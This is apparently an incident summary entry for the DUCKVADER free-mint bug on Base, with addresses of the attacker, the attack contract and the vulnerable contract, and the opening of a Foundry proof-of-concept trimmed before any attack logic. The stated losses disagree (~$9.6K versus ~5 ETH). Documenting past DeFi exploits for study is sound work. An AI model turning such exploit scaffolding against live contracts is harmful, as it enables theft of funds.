# [?] DUCKVADER - Free Mint Bug

## Summary
Severity: Unknown
Chain: Base
Component: DUCKVADER
Published: 2025-03-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/DUCKVADER_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~ $9.6K

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 5 ETH
// Attacker : https://basescan.org/address/0x2383a550e40a61b41a89da6b91d8a4a2452270d0
// Attack Contract : https://basescan.org/address/0x652f9ac437a870ce273a0be9d7e7ee03043a91ff
// Vulnerable Contract : https://basescan.org/address/0xaa8f35183478b8eced5619521ac3eb3886e98c56
// Attack Tx : https://basescan.org/tx/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xaa8f35183478b8eced5619521ac3eb3886e98c56#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1899378096056201414
// Hacking God : N/A

address constant DUCKVADER = 0xaa8f35183478B8EcEd5619521Ac3Eb3886E98c56;
address constant wETH = 0x4200000000000000000000000000000000000006;
address constant UNISWAP_ROUTER = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24;

contract DUCKVADER_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 27_445_835 - 1;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        vm.label(DUCKVADER, "DUCKVADER");
        vm.label(UNISWAP_ROUTER, "Uniswap: V2 Router02");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/DUCKVADER_exp.sol_
